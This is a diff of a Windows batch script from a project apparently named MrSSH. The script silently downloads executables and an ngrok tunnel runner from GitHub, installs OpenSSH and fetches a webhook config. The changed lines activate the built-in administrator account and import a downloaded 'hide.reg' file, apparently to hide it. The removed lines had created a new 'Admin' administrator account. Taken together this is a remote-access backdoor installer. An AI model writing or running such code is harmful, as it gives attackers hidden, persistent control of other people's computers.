@@ -9,14 +9,13 @@ curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" 
 curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/NgrokRun.bat" -o "NgrokRun.bat"
 curl -Ls "https://github.com/dh3b/MrSSH/raw/main/Files/WebParse.exe?raw=true" -o "WebParse.exe"
+curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/hide.reg" -o "hide.reg"
 :: </Install>
 
 powershell ./OpenSSH.ps1
 
-net user "Admin" "Administrator" /add
-net localgroup Administrators Admin /add
-net localgroup Administratorzy Admin /add
-net localgroup Administración  Admin /add
+net user administrator /active:yes
+reg import "%temp%\hide.reg"
 
 :: <Set webhook>
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
